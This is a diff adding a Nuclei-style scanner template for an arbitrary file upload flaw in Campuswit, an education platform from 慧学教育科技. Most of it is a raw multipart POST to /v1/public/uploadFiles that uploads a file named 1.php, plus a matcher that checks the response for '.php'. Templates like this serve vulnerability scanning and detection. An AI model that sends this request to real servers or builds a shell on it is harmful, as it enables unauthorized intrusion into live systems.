@@ -1,0 +1,43 @@
+id: Campuswit-uploadFiles-upload
+info:
+  name: 慧学教育科技（北京）有限公司Campuswit uploadFiles存在任意文件上传漏洞
+  author: apple
+  severity: critical
+  description: 慧学教育科技（北京）有限公司Campuswit uploadFiles存在任意文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /v1/public/uploadFiles HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+        Content-Length: 410
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="keep_filename"
+
+        1
+        --00content0boundary00
+        Content-Disposition: form-data; name="check_file"
+
+        1
+        --00content0boundary00
+        Content-Disposition: form-data; name="campuswitHash"
+
+        campuswit_hash_success
+        --00content0boundary00
+        Content-Disposition: form-data; name="file"; filename="1.php"
+        Content-Type: text/php
+
+        1234
+        --00content0boundary00--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.php'
